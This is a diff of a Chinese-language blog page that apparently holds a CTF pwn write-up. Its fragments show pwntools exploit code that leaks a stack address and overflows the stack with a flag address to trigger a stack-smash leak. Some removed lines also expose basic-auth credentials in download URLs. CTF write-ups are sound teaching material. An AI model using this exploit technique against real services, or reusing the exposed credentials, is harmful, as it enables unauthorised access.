@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -344,7 +344,7 @@
 <h4 id="调试过程">调试过程</h4>
 <p>本地调试的时候，随便设置了一个<code>flag</code>文件：</p>
 <p>首先需要读取出栈地址和计算出<code>flag</code>地址：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -367,12 +367,11 @@
 </span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">buf_low_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">5</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;buf_low_addr&#39;</span><span class="p">,</span> <span class="n">buf_low_addr</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;flag_addr&#39;</span><span class="p">,</span> <span class="n">flag_addr</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;flag_addr&#39;</span><span class="p">,</span> <span class="n">flag_addr</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003700.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>接下来直接对栈进行溢出，触发<code>stack smash</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -381,12 +380,11 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;leave something?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x200</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407003825.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h4 id="完整exp">完整exp</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -423,8 +421,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;leave something?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x200</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>最后远程打的<code>flag</code>为：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210407004100.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
